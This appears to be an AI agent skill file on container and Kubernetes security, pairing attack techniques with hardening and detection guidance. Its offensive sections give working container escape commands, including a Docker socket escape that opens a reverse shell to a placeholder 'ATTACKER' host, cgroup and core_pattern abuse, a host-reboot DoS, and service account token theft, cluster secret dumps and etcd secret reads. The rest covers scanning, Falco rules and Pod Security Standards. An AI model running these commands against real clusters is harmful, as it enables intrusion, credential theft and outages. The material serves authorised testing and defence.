---
name: container-security
description: <!-- Copyright (c) 2026 defconxt. All rights reserved. -->
---

<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: container-security
description: >-
  Container and Kubernetes security including Docker escape, K8s RBAC abuse,
  pod security standards, image vulnerability scanning, runtime protection with
  Falco/Tetragon, service mesh security, etcd secrets exposure, kubelet exploitation,
  registry poisoning, and container forensics. Covers both offensive container
  attacks and defensive hardening.
domain: cybersecurity
subdomain: container-security
tags:
  - docker
  - kubernetes
  - container-escape
  - falco
  - tetragon
  - rbac
  - pod-security
  - image-scanning
  - service-mesh
  - runtime-security
version: "1.0"
author: defconxt
license: AGPL-3.0
compatibility: Designed for Claude Code, GitHub Copilot, OpenAI Codex, Cursor, Gemini CLI, and any agentskills.io-compatible agent.
metadata:
  mitre-attack: ["T1610", "T1611", "T1609", "T1552.007", "T1613"]
  nist-csf: ["PR.DS-6", "PR.IP-1", "DE.CM-7"]
  frameworks: ["CIS Kubernetes Benchmark", "NSA K8s Hardening Guide", "NIST SP 800-190"]
---

# Container Security

## When to Use

Activate when the operator asks about Docker security, Kubernetes attacks, container
escape, pod security policies, image scanning, K8s RBAC, Falco rules, service mesh
security, or container runtime protection.

Mode: `[MODE: RED]` for container attacks; `[MODE: BLUE]` for runtime detection; `[MODE: ARCHITECT]` for secure K8s design.

## Prerequisites

- Docker and/or Kubernetes cluster access
- kubectl configured for target cluster
- Trivy, Grype, or Snyk for image scanning
- Falco or Tetragon for runtime security

## Quick Reference

| Attack / Control | Command | Context |
|-----------------|---------|---------|
| Container escape (privileged) | `nsenter -t 1 -m -u -i -n -p -- /bin/bash` | Offensive |
| Docker socket escape | `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host` | Offensive |
| K8s secret extraction | `kubectl get secrets -A -o json \| jq '.items[].data'` | Offensive |
| Kubelet anonymous access | `curl -sk https://NODE:10250/pods` | Offensive |
| Pod exec via kubelet | `curl -sk https://NODE:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=id"` | Offensive |
| Image scan | `trivy image --severity HIGH,CRITICAL target:latest` | Defensive |
| K8s CIS benchmark | `kube-bench run --targets master,node,policies` | Defensive |
| Falco rule test | `falco -r /etc/falco/falco_rules.yaml --dry-run` | Defensive |
| Network policy audit | `kubectl get netpol -A -o yaml` | Defensive |
| RBAC audit | `kubectl auth can-i --list --as=system:serviceaccount:NS:SA` | Defensive |

## Workflow

### 1. Container Escape Techniques

```bash
# Check if running in container
cat /proc/1/cgroup 2>/dev/null | grep -q docker && echo "In Docker"
ls /.dockerenv 2>/dev/null && echo "In Docker"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep KUBERNETES && echo "In K8s"

# Privileged container escape (nsenter)
# Requires: privileged:true or SYS_ADMIN capability
nsenter -t 1 -m -u -i -n -p -- /bin/bash  # Enter host PID 1 namespace

# Docker socket mount escape
# If /var/run/docker.sock is mounted:
docker -H unix:///var/run/docker.sock run -d -v /:/host --privileged alpine \
  sh -c 'chroot /host bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'

# cgroup escape (CVE-2022-0492)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
echo '#!/bin/bash' > /cmd
echo 'cat /etc/shadow > /tmp/cgrp/output' >> /cmd
chmod +x /cmd
echo "/cmd" > /tmp/cgrp/release_agent

# Capabilities abuse
# CAP_SYS_PTRACE: inject into host processes
# CAP_NET_RAW: sniff host network
# CAP_DAC_READ_SEARCH: read any file
capsh --print  # Check current capabilities

# /proc/sysrq-trigger (if mounted)
echo b > /proc/sysrq-trigger  # Reboot host (DoS)

# Core_pattern escape
echo "|/path/to/shell" > /proc/sys/kernel/core_pattern
```

### 2. Kubernetes Attack Paths

```bash
# Service account token theft
cat /var/run/secrets/kubernetes.io/serviceaccount/token
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Enumerate permissions from inside pod
kubectl auth can-i --list

# Cluster-wide secret dump
kubectl get secrets -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data | keys)"'

# RBAC privilege escalation — create privileged pod
cat <<YAML | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privesc
spec:
  containers:
  - name: shell
    image: alpine
    command: ["/bin/sh","-c","sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
  serviceAccountName: default
YAML

# etcd direct access (if exposed)
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets/default/mysecret
```

### 3. Image Security

```bash
# Scan image for CVEs
trivy image --severity HIGH,CRITICAL --format json target:latest
grype target:latest --only-fixed

# Check for secrets in image layers
docker save target:latest | tar -xf - -C /tmp/layers/
for layer in /tmp/layers/*/layer.tar; do
  tar -tf "$layer" 2>/dev/null | grep -iE 'password|secret|key|token|\.env|id_rsa'
done

# Dockerfile security audit
hadolint Dockerfile

# Verify image signature
cosign verify --key cosign.pub target:latest

# SBOM generation
syft target:latest -o spdx-json > sbom.json
```

### 4. Runtime Security (Falco/Tetragon)

See `references/runtime-security.md` for rule authoring guide.

```yaml
# Falco rule: detect container escape via nsenter
- rule: Container Escape via nsenter
  desc: Detect nsenter used to access host namespaces
  condition: >
    spawned_process and container and proc.name = nsenter
    and proc.args contains "-t 1"
  output: >
    Container escape via nsenter (user=%user.name container=%container.name
    command=%proc.cmdline image=%container.image.repository)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation, T1611]

# Falco rule: detect sensitive file read in container
- rule: Read Sensitive File in Container
  desc: Detect reads of sensitive files from within containers
  condition: >
    open_read and container and
    (fd.name startswith /etc/shadow or fd.name startswith /etc/passwd
     or fd.name startswith /run/secrets)
  output: >
    Sensitive file read in container (file=%fd.name container=%container.name
    image=%container.image.repository)
  priority: WARNING
  tags: [container, filesystem, mitre_credential_access, T1552]
```

### 5. Kubernetes Hardening

```yaml
# Pod Security Standards (Restricted)
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted

---
# Network policy: deny all, allow specific
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]

---
# Minimal RBAC: read-only service account
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: read-only
  namespace: production
rules:
- apiGroups: [""]
  resources: ["pods", "services"]
  verbs: ["get", "list", "watch"]
```

## Verification

- [ ] Container escape vectors tested (privileged, socket, capabilities)
- [ ] Kubernetes RBAC audited with `kubectl auth can-i --list`
- [ ] Images scanned for CVEs (HIGH/CRITICAL = 0)
- [ ] Pod security standards enforced at namespace level
- [ ] Network policies deny-all by default
- [ ] Runtime security (Falco/Tetragon) deployed and alerting
- [ ] Secrets not stored in environment variables (use CSI driver)
- [ ] etcd encrypted at rest and access restricted

## Detection Opportunities

- Falco alerts on nsenter, mount, and capability abuse in containers
- Kubernetes audit logs for secret access, RBAC changes, privileged pod creation
- Image scanning in CI/CD pipeline (fail build on HIGH+ CVEs)
- Network policy violation logs for lateral movement attempts
